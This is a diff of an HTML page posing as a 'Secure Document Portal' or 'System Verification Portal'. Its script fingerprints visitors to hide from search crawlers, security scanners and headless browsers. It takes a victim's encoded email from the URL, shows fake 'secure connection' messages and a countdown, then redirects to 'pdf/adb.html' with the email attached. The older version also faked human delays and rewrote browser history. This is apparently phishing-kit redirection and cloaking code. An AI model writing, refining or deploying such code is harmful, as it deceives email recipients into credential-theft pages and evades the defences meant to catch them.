@@ -5,81 +5,159 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="robots" content="noindex, nofollow" />
   <meta name="googlebot" content="noindex, nofollow" />
-  <title>Secure Document Portal</title>
+  <title>System Verification Portal</title>
   <style>
-    body {
+    * {
+      box-sizing: border-box;
       margin: 0;
       padding: 0;
-      background: #1a202c;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, sans-serif;
+      background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
+      color: #e2e8f0;
+      line-height: 1.6;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: white;
-    }
-    .container {
-      text-align: center;
-      max-width: 500px;
       padding: 20px;
     }
+    .container {
+      background: rgba(26, 32, 44, 0.95);
+      border-radius: 12px;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+      padding: 30px;
+      width: 100%;
+      max-width: 500px;
+      text-align: center;
+      border: 1px solid #4a5568;
+    }
     h1 {
-      font-size: 24px;
-      margin-bottom: 10px;
+      font-size: 28px;
+      margin-bottom: 15px;
       color: #a0aec0;
+      font-weight: 600;
     }
     .status {
       background: #2d3748;
-      padding: 15px;
+      padding: 20px;
       border-radius: 8px;
-      margin: 15px 0;
-      font-size: 14px;
+      margin: 20px 0;
+      font-size: 16px;
+      border-left: 4px solid #4a6cf7;
+    }
+    .loader-container {
+      display: flex;
+      justify-content: center;
+      margin: 25px 0;
     }
     .loader {
       border: 3px solid #2d3748;
       border-top: 3px solid #4a6cf7;
       border-radius: 50%;
-      width: 30px;
-      height: 30px;
+      width: 40px;
+      height: 40px;
       animation: spin 1s linear infinite;
-      margin: 20px auto;
+    }
+    .progress-bar {
+      height: 6px;
+      background: #2d3748;
+      border-radius: 3px;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+    .progress {
+      height: 100%;
+      background: #4a6cf7;
+      border-radius: 3px;
+      width: 0%;
+      animation: progress 1.5s ease-in-out forwards;
     }
     .countdown {
-      font-size: 12px;
-      margin-top: 10px;
+      font-size: 14px;
       color: #a0aec0;
+      margin-top: 15px;
+    }
+    .security-indicator {
+      display: flex;
+      justify-content: center;
+      gap: 5px;
+      margin: 15px 0;
+    }
+    .dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #2d3748;
+      animation: pulse 1.5s infinite;
+    }
+    .dot:nth-child(2) { animation-delay: 0.2s; }
+    .dot:nth-child(3) { animation-delay: 0.4s; }
+    .dot:nth-child(4) { animation-delay: 0.6s; }
+    .footer {
+      margin-top: 25px;
+      font-size: 12px;
+      color: #718096;
     }
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
+    @keyframes progress {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+    @keyframes pulse {
+      0%, 100% { background: #2d3748; }
+      50% { background: #4a6cf7; }
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Secure Document Portal</h1>
-    <div class="status" id="status">Initializing secure connection...</div>
-    <div class="loader"></div>
-    <div class="countdown" id="countdown"></div>
+    <h1>System Verification Portal</h1>
+    <div class="status" id="status">Initializing secure environment...</div>
+    
+    <div class="security-indicator">
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+    
+    <div class="loader-container">
+      <div class="loader"></div>
+    </div>
+    
+    <div class="progress-bar">
+      <div class="progress"></div>
+    </div>
+    
+    <div class="countdown" id="countdown">Preparing redirect in 3s</div>
+    
+    <div class="footer">
+      Secure connection • Encrypted transmission • Protected content
+    </div>
   </div>
 
   <script>
-    (function () {
-      // Enhanced bot detection with more sophisticated checks
-      function isAutomated() {
-        // Check user agent
-        const bots = [
+    (function() {
+      // Enhanced bot detection with multiple layers
+      function detectAutomation() {
+        // User agent check
+        const botPatterns = [
           /bot/i, /crawler/i, /spider/i, /crawling/i,
           /google/i, /bing/i, /yahoo/i, /facebook/i,
           /duckduckgo/i, /baidu/i, /yandex/i, /headless/i,
           /phantom/i, /puppeteer/i, /selenium/i, /playwright/i
         ];
         
-        if (bots.some(bot => bot.test(navigator.userAgent))) {
+        if (botPatterns.some(pattern => pattern.test(navigator.userAgent))) {
           return true;
         }
         
-        // Check for automation properties
+        // Automation properties check
         if (navigator.webdriver || 
             window.callPhantom || 
             window._phantom || 
@@ -87,177 +165,110 @@
           return true;
         }
         
-        // Check language and plugins (bots often have empty plugins)
+        // Plugin and language checks
         if (navigator.languages.length === 0 || navigator.plugins.length === 0) {
           return true;
         }
         
-        // Check screen properties (headless browsers often have unusual dimensions)
+        // Screen resolution check
         if (window.screen.width < 300 || window.screen.height < 300) {
-          return true;
-        }
-        
-        // Check performance metrics (real browsers have more consistent timing)
-        const perf = performance.timing;
-        const navigationTime = perf.loadEventEnd - perf.navigationStart;
-        if (navigationTime < 100) { // Suspiciously fast loading
           return true;
         }
         
         return false;
       }
-
-      // Human behavior simulation with random delays
-      function simulateHumanInteraction() {
-        const randomDelay = Math.floor(Math.random() * 1000) + 500;
-        return new Promise(resolve => setTimeout(resolve, randomDelay));
-      }
-
+      
       // Obfuscated token generation
       function generateToken(length = 24) {
         const array = new Uint8Array(length);
         crypto.getRandomValues(array);
-        // Convert to a more complex encoding
-        return btoa(String.fromCharCode.apply(null, array))
-          .replace(/\+/g, '-')
-          .replace(/\//g, '_')
-          .replace(/=/g, '');
+        return Array.from(array, b => b.toString(16).padStart(2, "0")).join("");
       }
-
-      // URL obfuscation/encoding
-      function obfuscateData(data) {
-        // Double encode and add some random padding
-        const randomPrefix = generateToken(4);
-        const randomSuffix = generateToken(4);
-        return randomPrefix + btoa(data) + randomSuffix;
-      }
-
-      // Deobfuscate data
-      function deobfuscateData(obfuscated) {
-        try {
-          // Remove padding and decode
-          const encoded = obfuscated.substring(4, obfuscated.length - 4);
-          return atob(encoded);
-        } catch (e) {
-          return null;
-        }
-      }
-
-      // Check if the current environment seems legitimate
-      function isEnvironmentValid() {
-        // Check if we're in an iframe (often used by malicious sites)
-        if (window.self !== window.top) {
-          return false;
-        }
-        
-        // Check document referrer (if available)
-        if (document.referrer) {
-          const suspiciousReferrers = [
-            'unknown', 'null', '', 'localhost'
-          ];
-          if (suspiciousReferrers.includes(document.referrer.toLowerCase())) {
-            return false;
-          }
-        }
-        
-        return true;
-      }
-
-      // Main execution flow
-      async function init() {
-        // Update status with generic message
-        document.getElementById('status').textContent = "Verifying session security...";
-        
-        // Check if automated
-        if (isAutomated()) {
-          // Don't immediately reveal detection
-          await simulateHumanInteraction();
-          document.getElementById('status').textContent = "System verification in progress...";
-          await simulateHumanInteraction();
-          document.getElementById('status').textContent = "Access requires manual verification";
-          document.querySelector('.loader').style.display = "none";
-          return;
-        }
-        
-        // Check environment
-        if (!isEnvironmentValid()) {
-          document.getElementById('status').textContent = "Security environment check failed";
-          document.querySelector('.loader').style.display = "none";
-          return;
-        }
-        
-        // Get the encoded email with multiple fallback options
-        let encodedEmail = '';
-        
-        // First try hash
+      
+      // Get encoded data from various possible sources
+      function getEncodedData() {
+        // Try hash first
         if (window.location.hash.substring(1)) {
-          encodedEmail = window.location.hash.substring(1);
-        } 
-        // Then try query parameter (less obvious name)
-        else if (new URLSearchParams(window.location.search).has('data')) {
-          encodedEmail = new URLSearchParams(window.location.search).get('data');
-        }
-        // Then try sessionStorage (for multi-step flows)
-        else if (sessionStorage.getItem('secureData')) {
-          encodedEmail = sessionStorage.getItem('secureData');
-          sessionStorage.removeItem('secureData'); // Clear after use
+          return window.location.hash.substring(1);
         }
         
-        // If still no data, show error
+        // Try query parameter with less obvious name
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('data')) {
+          return urlParams.get('data');
+        }
+        if (urlParams.has('token')) {
+          return urlParams.get('token');
+        }
+        
+        // Try session storage as fallback
+        if (sessionStorage.getItem('secureData')) {
+          return sessionStorage.getItem('secureData');
+        }
+        
+        return null;
+      }
+      
+      // Update countdown display
+      function updateCountdown(seconds) {
+        const countdownEl = document.getElementById('countdown');
+        if (seconds > 0) {
+          countdownEl.textContent = `Preparing redirect in ${seconds}s`;
+        } else {
+          countdownEl.textContent = "Redirecting now...";
+        }
+      }
+      
+      // Main execution function
+      function executeRedirect() {
+        // Check for automation
+        if (detectAutomation()) {
+          document.getElementById('status').textContent = "Verification process requires human interaction";
+          document.querySelector('.countdown').style.display = 'none';
+          return;
+        }
+        
+        // Get the encoded data
+        const encodedEmail = getEncodedData();
+        
         if (!encodedEmail) {
           document.getElementById('status').textContent = "Secure session token not found";
-          document.querySelector('.loader').style.display = "none";
+          document.querySelector('.countdown').style.display = 'none';
           return;
         }
         
-        // Deobfuscate if needed (check if it looks obfuscated)
-        if (encodedEmail.length > 40) { // Simple heuristic
-          const deobfuscated = deobfuscateData(encodedEmail);
-          if (deobfuscated) {
-            encodedEmail = deobfuscated;
-          }
-        }
+        // Update status
+        document.getElementById('status').textContent = "Establishing secure channel...";
         
-        // Generate token with human-like delay
-        await simulateHumanInteraction();
-        document.getElementById('status').textContent = "Generating secure token...";
-        
+        // Generate token quickly
         const token = generateToken();
         
         // Build redirect URL with less predictable structure
-        const randomPathComponent = generateToken(8);
-        const redirectUrl = `pdf/${randomPathComponent}/adb.html#e=${encodeURIComponent(encodedEmail)}&t=${token}&v=2`;
+        const randomParam = generateToken(8);
+        const redirectUrl = `pdf/adb.html?ref=${randomParam}#email=${encodedEmail}&token=${token}&t=${Date.now()}`;
         
-        // Update status with countdown
+        // Update status
         document.getElementById('status').textContent = "Secure connection established";
         
-        // Add countdown timer to make it look more natural
+        // Start countdown
         let countdown = 3;
-        const countdownEl = document.getElementById('countdown');
-        countdownEl.textContent = `Redirecting in ${countdown} seconds...`;
+        updateCountdown(countdown);
         
         const countdownInterval = setInterval(() => {
           countdown--;
-          if (countdown > 0) {
-            countdownEl.textContent = `Redirecting in ${countdown} seconds...`;
-          } else {
+          updateCountdown(countdown);
+          
+          if (countdown <= 0) {
             clearInterval(countdownInterval);
-            countdownEl.textContent = "Proceeding to secure document...";
             
-            // Use replace to avoid back navigation, but with additional obfuscation
-            setTimeout(() => {
-              // Add some browser history manipulation to obscure the redirect
-              window.history.replaceState(null, '', '/loading.html');
-              
-              // Final redirect
-              window.location.replace(redirectUrl);
-            }, 800);
+            // Use replace to avoid back navigation
+            window.location.replace(redirectUrl);
           }
         }, 1000);
       }
-
-      // Start the process with a slight initial delay
-      setTimeout(init, 500);
+      
+      // Start the process with minimal delay
+      setTimeout(executeRedirect, 300);
     })();
   </script>
 </body>
